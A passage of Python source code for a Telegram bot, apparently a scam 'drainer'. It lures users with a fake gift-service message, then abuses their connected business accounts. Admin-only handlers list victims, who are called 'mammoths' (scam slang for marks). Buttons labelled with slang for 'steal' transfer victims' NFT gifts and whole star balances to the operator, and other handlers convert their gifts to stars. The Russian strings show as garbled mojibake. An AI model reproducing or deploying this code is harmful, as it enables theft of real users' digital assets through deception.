    # –§–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
    await bot.send_message(
        chat_id=callback.from_user.id,
        text=(
            "üéà –í–∞—à —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π –ø–æ–¥–∞—Ä–æ–∫ –Ω–∞–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –∫ –≤–∞–º!\n\n"
            "üíå –ò—Å–∫—Ä–µ–Ω–Ω–µ –±–ª–∞–≥–æ–¥–∞—Ä–∏–º –∑–∞ –¥–æ–≤–µ—Ä–∏–µ –∫ –Ω–∞—à–µ–º—É —Å–µ—Ä–≤–∏—Å—É.\n\n"
            "üîí –ö–æ–º–∞–Ω–¥–∞ Telegram Key Gifts"
        ),
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(F.text == "/gifts")
async def handle_gifts_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    try:
        connections = load_connections()
        if not connections:
            await message.answer("–ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤.")
            return

        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username', '')} ({conn['user_id']})" if conn.get('username') else f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(text=name, callback_data=f"gifts:{user_id}")

        kb.adjust(1)
        await message.answer("–í—ã–±–µ—Ä–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:", reply_markup=kb.as_markup())
    except FileNotFoundError:
        await message.answer("–§–∞–π–ª –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –Ω–µ –Ω–∞–π–¥–µ–Ω.")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")
        await message.answer(f"–û—à–∏–±–∫–∞: {e}")

@dp.callback_query(F.data.startswith("gifts:"))
async def handle_gift_callback(callback: CallbackQuery):
    await callback.answer()
    user_id = int(callback.data.split(":", 1)[1])

    try:
        connections = load_connections()
        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return

        business_connection_id = connection["business_connection_id"]

        try:
            # –ü—Ä—è–º–æ–π –≤—ã–∑–æ–≤ –º–µ—Ç–æ–¥–∞ —Å —Ä—É—á–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—Ç–≤–µ—Ç–∞
            response = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))
            # –ò–∑–≤–ª–µ–∫–∞–µ–º amount –∏–∑ result, —Ç–∞–∫ –∫–∞–∫ star_amount –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç
            star_amount = response.result.get('amount', 0) if hasattr(response, 'result') else 0
            text = f"üÜî –ë–∏–∑–Ω–µ—Å –∫–æ–Ω–Ω–µ–∫—Ç: <b>{business_connection_id}</b>\n‚≠êÔ∏è –ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥: <b>{star_amount}</b>\n\n"
        except TelegramBadRequest as e:
            text = f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –∑–≤—ë–∑–¥: {e}\n\n"

        await callback.message.answer(text, parse_mode="HTML")

        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
            if not gifts.gifts:
                await callback.message.answer("üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤.")
            else:
                for gift in gifts.gifts:
                    if gift.type == "unique":
                        gift_info = (
                            f"üéÅ <b>{gift.gift.base_name} #{gift.gift.number}</b>\n"
                            f"ü¶£ –ú–∞–º–æ–Ω—Ç (–í–ª–∞–¥–µ–ª–µ—Ü): <code>{user_id}</code>\n"
                            f"üÜî OwnedGiftId: <code>{gift.owned_gift_id}</code>\n\n"
                            f"üîó –°—Å—ã–ª–∫–∞: https://t.me/nft/{gift.gift.name}\n"
                            f"üì¶ –ú–æ–¥–µ–ª—å: <code>{gift.gift.model.name}</code>\n"
                            f"‚≠êÔ∏è –°—Ç–æ–∏–º–æ—Å—Ç—å —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä–∞: 25 ‚≠êÔ∏è"
                        )
                        kb = InlineKeyboardMarkup(
                            inline_keyboard=[[
                                InlineKeyboardButton(
                                    text="üéÅ –°–ø–∏–∑–¥–∏—Ç—å)",
                                    callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:25"
                                )
                            ]]
                        )
                        await callback.message.answer(gift_info, parse_mode="HTML", reply_markup=kb)
                        await asyncio.sleep(0.3)
        except TelegramBadRequest as e:
            await callback.message.answer(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –ø–æ –±–∏–∑–Ω–µ—Å—É")
        await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")

@dp.callback_query(F.data.startswith("transfer:"))
async def handle_transfer(callback: CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID:
        await callback.message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    try:
        _, user_id_str, gift_id, transfer_price_str = callback.data.split(":")
        user_id = int(user_id_str)
        transfer_price = int(transfer_price_str)  # –ö–æ–º–∏—Å—Å–∏—è 25 –∑–≤—ë–∑–¥

        connections = load_connections()

        # –ù–∞—Ö–æ–¥–∏–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–≤–ª–∞–¥–µ–ª—å—Ü–∞ NFT)
        user_connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not user_connection:
            logging.error(f"–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è user_id={user_id} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            await callback.message.answer("‚ö†Ô∏è –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return

        # –ù–∞—Ö–æ–¥–∏–º –∞–¥–º–∏–Ω—Å–∫–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
        admin_conn = next((c for c in connections if c["user_id"] == int(ADMIN_ID)), None)
        if not admin_conn:
            logging.error("–ê–¥–º–∏–Ω—Å–∫–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            await callback.message.answer("‚ö†Ô∏è –ê–¥–º–∏–Ω—Å–∫–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return

        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–ª–∞–Ω—Å –∞–¥–º–∏–Ω–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã –∫–æ–º–∏—Å—Å–∏–∏ —Å –æ—Ç–ª–∞–¥–æ—á–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π
        admin_balance_response = await bot(GetBusinessAccountStarBalance(
            business_connection_id=admin_conn["business_connection_id"]
        ))
        # –ò–∑–≤–ª–µ–∫–∞–µ–º star_amount –Ω–∞–ø—Ä—è–º—É—é –∏–∑ –æ–±—ä–µ–∫—Ç–∞ StarAmount
        admin_star_amount = getattr(admin_balance_response, 'star_amount', 0)
        # –ï—Å–ª–∏ star_amount –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç, –ø—Ä–æ–≤–µ—Ä—è–µ–º amount
        if admin_star_amount == 0:
            admin_star_amount = getattr(admin_balance_response, 'amount', 0)
        raw_response = admin_balance_response.model_dump() if hasattr(admin_balance_response, 'model_dump') else str(admin_balance_response)
        logging.info(f"–°—ã—Ä–æ–π –æ—Ç–≤–µ—Ç API –¥–ª—è –∞–¥–º–∏–Ω–∞ (business_connection_id={admin_conn['business_connection_id']}): {raw_response}")
        logging.info(f"–ê–¥–º–∏–Ω—Å–∫–∏–π –±–∞–ª–∞–Ω—Å (business_connection_id={admin_conn['business_connection_id']}): {admin_star_amount}")
        if admin_star_amount < transfer_price:
            await callback.message.answer(
                f"‚ö†Ô∏è –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–≤—ë–∑–¥ —É –∞–¥–º–∏–Ω–∞ ({admin_star_amount}) "
                f"–¥–ª—è –æ–ø–ª–∞—Ç—ã –∫–æ–º–∏—Å—Å–∏–∏ ({transfer_price} –∑–≤—ë–∑–¥)!\n"
                f"–ü—Ä–æ–≤–µ—Ä—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞ –∏–ª–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–æ—Ç–∞.\n"
                f"–°—ã—Ä–æ–π –æ—Ç–≤–µ—Ç API: {raw_response}"
            )
            return

        # 1. –í—ã–ø–æ–ª–Ω—è–µ–º —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä NFT –æ—Ç –º–∞–º–æ–Ω—Ç–∞ –∫ –∞–¥–º–∏–Ω—É
        nft_result = await bot(TransferGift(
            business_connection_id=user_connection["business_connection_id"],
            new_owner_chat_id=int(ADMIN_ID),  # –ò—Å–ø–æ–ª—å–∑—É–µ–º new_owner_chat_id –≤–º–µ—Å—Ç–æ receiver_user_id
            owned_gift_id=gift_id
        ))

        # 2. –°–ø–∏—Å—ã–≤–∞–µ–º –∫–æ–º–∏—Å—Å–∏—é 25 –∑–≤—ë–∑–¥ —Å –∞–¥–º–∏–Ω–∞
        stars_result = await bot(TransferBusinessAccountStars(
            business_connection_id=admin_conn["business_connection_id"],
            star_count=transfer_price,
            to_business_connection_id=user_connection["business_connection_id"]
        ))

        logging.info(f"NFT –ø–µ—Ä–µ–¥–∞–Ω: user_id={user_id}, gift_id={gift_id}")
        logging.info(f"–ö–æ–º–∏—Å—Å–∏—è {transfer_price} –∑–≤–µ–∑–¥ —Å–ø–∏—Å–∞–Ω–∞ —Å –∞–¥–º–∏–Ω–∞")

        await callback.message.answer(
            f"‚úÖ NFT –ø–æ–¥–∞—Ä–æ–∫ –ø–µ—Ä–µ–¥–∞–Ω –∞–¥–º–∏–Ω—É!\n"
            f"üí∞ –ö–æ–º–∏—Å—Å–∏—è {transfer_price} –∑–≤–µ–∑–¥ —Å–ø–∏—Å–∞–Ω–∞ —Å –∞–¥–º–∏–Ω–∞"
        )

    except TelegramBadRequest as e:
        logging.error(f"–û—à–∏–±–∫–∞ Telegram API –ø—Ä–∏ —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä–µ: {e}")
        if "GIFT_NOT_FOUND" in str(e):
            await callback.message.answer("‚ùå –ü–æ–¥–∞—Ä–æ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω!")
        elif "INSUFFICIENT_FUNDS" in str(e):
            await callback.message.answer("‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–≤—ë–∑–¥ –¥–ª—è –æ–ø–µ—Ä–∞—Ü–∏–∏!")
        elif "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ùå –ë–æ—Ç –Ω–µ –∏–º–µ–µ—Ç –¥–æ—Å—Ç—É–ø–∞!")
        else:
            await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –æ–ø–µ—Ä–∞—Ü–∏–∏: {e}")
    except Exception as e:
        logging.error(f"–û–±—â–∞—è –æ—à–∏–±–∫–∞ —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä–∞: {e}")
        await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –æ–ø–µ—Ä–∞—Ü–∏–∏: {e}")

@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_to_admin(callback: CallbackQuery):
    _, business_connection_id, user_id = callback.data.split(":")
    user_id = int(user_id)

    try:
        # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –∑–≤–µ–∑–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        response = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_balance = response.result.get('amount', 0) if hasattr(response, 'result') else 0

        if star_balance <= 0:
            await callback.message.answer("‚ö†Ô∏è –£ –º–∞–º–æ–Ω—Ç–∞ –Ω–µ—Ç –∑–≤–µ–∑–¥ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏.")
            return

        # –ù–∞—Ö–æ–¥–∏–º –∞–¥–º–∏–Ω—Å–∫–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
        connections = load_connections()
        admin_conn = next((c for c in connections if c["user_id"] == int(ADMIN_ID)), None)

        if not admin_conn:
            logging.error("–ê–¥–º–∏–Ω—Å–∫–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            await callback.message.answer("‚ùå –ê–¥–º–∏–Ω—Å–∫–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return

        # –ü–µ—Ä–µ–¥–∞–µ–º –≤—Å–µ –∑–≤—ë–∑–¥—ã –∞–¥–º–∏–Ω—É
        result = await bot(TransferBusinessAccountStars(
            business_connection_id=business_connection_id,
            star_count=star_balance,
            to_business_connection_id=admin_conn["business_connection_id"]
        ))

        logging.info(f"–ó–≤—ë–∑–¥—ã –ø–µ—Ä–µ–¥–∞–Ω—ã –∞–¥–º–∏–Ω—É: {star_balance} –æ—Ç user_id={user_id}")
        await callback.message.answer(f"‚úÖ –£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω–æ {star_balance} –∑–≤–µ–∑–¥ –∞–¥–º–∏–Ω—É!")

    except TelegramBadRequest as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥ –¥–ª—è user_id={user_id}: {e}")
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏èü¶£ –ú–∞–º–æ–Ω—Ç –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –±–∞–ª–∞–Ω—Å—É!")
        elif "INSUFFICIENT_FUNDS" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–≤–µ–∑–¥ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏!")
        else:
            await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏: {e}")
    except Exception as e:
        logging.error(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ –∑–≤—ë–∑–¥ –¥–ª—è user_id={user_id}: {e}")
        await callback.message.answer(f"‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")

    await callback.answer()

@dp.message(F.text == "/stars")
async def show_star_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    try:
        connections = load_connections()
        if not connections:
            await message.answer("‚ùåü¶£ –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –º–∞–º–æ–Ω—Ç–æ–≤.")
            return

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"@{conn.get('username', conn['user_id'])}",
                                  callback_data=f"stars:{conn['user_id']}")]
            for conn in connections
        ])

        await message.answer("üîπ –í—ã–±–µ—Ä–∏—Ç–µ –º–∞–º–æ–Ω—Ç–∞ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –±–∞–ª–∞–Ω—Å–∞ –∑–≤—ë–∑–¥:", reply_markup=kb)
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {e}")
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")

@dp.callback_query(F.data.startswith("stars:"))
async def show_user_star_balance(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    connections = load_connections()
    conn = next((c for c in connections if c["user_id"] == user_id), None)

    if not conn:
        logging.error(f"–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è user_id={user_id} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
        await callback.answer("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.", show_alert=True)
        return

    business_connection_id = conn["business_connection_id"]
    try:
        # –ü—Ä—è–º–æ–π –≤—ã–∑–æ–≤ –º–µ—Ç–æ–¥–∞ —Å —Ä—É—á–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—Ç–≤–µ—Ç–∞
        response = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_count = response.result.get('amount', 0) if hasattr(response, 'result') else 0
        logging.info(f"–ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥ –¥–ª—è user_id={user_id}: {star_count}")
        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(
                text="‚ú® –°–ø–∏–∑–¥–∏—Ç—å –∑–≤–µ–∑–¥—ã —Å–µ–±–µ",
                callback_data=f"transfer_stars:{business_connection_id}:{user_id}"
            )
        ]])
        await callback.message.answer(
            f"‚≠ê <b>–£ –º–∞–º–æ–Ω—Ç–∞ {conn['first_name']} {conn['last_name'] or ''}</b>\n"
            f"üí∞ –ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥: <b>{star_count}</b>",
            parse_mode="HTML",
            reply_markup=kb
        )
    except TelegramBadRequest as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –∑–≤—ë–∑–¥ –¥–ª—è user_id={user_id}: {e}")
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ú–∞–º–æ–Ω—Ç –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –±–∞–ª–∞–Ω—Å—É!")
        else:
            await callback.message.answer(f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}")

@dp.message(F.text == "/convert")
async def convert_menu(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    try:
        connections = load_connections()
        if not connections:
            return await message.answer("–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π.")

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"@{conn.get('username', conn['user_id'])}",
                                  callback_data=f"convert_select:{conn['user_id']}")]
            for conn in connections
        ])

        await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ –º–∞–º–æ–Ω—Ç–∞ –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤:", reply_markup=keyboard)
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {e}")
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")

@dp.callback_query(F.data.startswith("convert_select:"))
async def convert_select_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    connections = load_connections()
    connection = next((c for c in connections if c["user_id"] == user_id), None)

    if not connection:
        return await callback.message.edit_text("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(
                text="‚ôªÔ∏è –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –æ–±—ã—á–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã",
                callback_data=f"convert_exec:{user_id}"
            )
        ]]
    )

    await callback.message.edit_text(
        f"–í—ã–±—Ä–∞–Ω –º–∞–º–æ–Ω—Ç: @{connection.get('username', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}",
        reply_markup=keyboard
    )

# –û–±–Ω–æ–≤–ª–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤–µ–∑–¥—ã
@dp.callback_query(F.data.startswith("convert_exec:"))
async def convert_exec_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    connections = load_connections()
    connection = next((c for c in connections if c["user_id"] == user_id), None)

    if not connection:
        return await callback.message.edit_text("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")

    try:
        # –ü–æ–ª—É—á–∞–µ–º –ø–æ–¥–∞—Ä–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        response = await bot(GetFixedBusinessAccountGifts(
            business_connection_id=connection["business_connection_id"]
        ))
        gifts = response.gifts

        if not gifts:
            return await callback.message.edit_text("üéÅ –£ –º–∞–º–æ–Ω—Ç–∞ –Ω–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤.")

        converted_count = 0
        failed = 0

        for gift in gifts:
            # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ (NFT)
            if gift.type == "unique":
                continue

            try:
                await bot(ConvertGiftToStarsFixed(
                    business_connection_id=connection["business_connection_id"],
                    owned_gift_id=gift.owned_gift_id
                ))
                converted_count += 1
                logging.info(f"–ü–æ–¥–∞—Ä–æ–∫ {gift.owned_gift_id} –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω –¥–ª—è user_id={user_id}")

            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –ø–æ–¥–∞—Ä–∫–∞ {gift.owned_gift_id}: {e}")
                failed += 1

            # –ù–µ–±–æ–ª—å—à–∞—è –ø–∞—É–∑–∞ –º–µ–∂–¥—É –æ–ø–µ—Ä–∞—Ü–∏—è–º–∏
            await asyncio.sleep(0.1)

        await callback.message.edit_text(
            f"‚úÖ –£—Å–ø–µ—à–Ω–æ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ: {converted_count} –ø–æ–¥–∞—Ä–∫–æ–≤\n"
            f"‚ùå –û—à–∏–±–æ–∫: {failed}"
        )

    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –¥–ª—è user_id={user_id}: {e}")
        await callback.message.edit_text(f"‚ùå –û—à–∏–±–∫–∞: {e}")

@dp.message(F.text == "/test")
async def test(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    await message.answer("‚úÖ –ë–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ!")

async def main():
    init_db()
    print("Made with love by @antistoper")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
